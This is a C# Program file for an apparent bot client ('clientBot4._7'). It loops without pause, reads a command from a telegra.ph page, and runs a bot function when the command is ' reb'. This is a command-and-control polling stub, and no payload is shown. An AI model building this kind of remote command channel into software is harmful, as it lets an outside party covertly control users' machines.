using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace clientBot4._7
{
    static class Program
    {
      
        //Запрос на сервер раз в 1000 секунд
        //todo fix bug with exeception
        //add functions
        [STAThread]
        static void Main()
        {
            while (true)
            {
                WebCommand wc = new WebCommand("https://telegra.ph/Tets-09-14");
                Console.WriteLine(wc.command);
                if (wc.command == " reb")
                {
                    BotFunctions bt = new BotFunctions();
                    bt.ShowPrettyPictures();
                }
            }
            
        }
    }
}
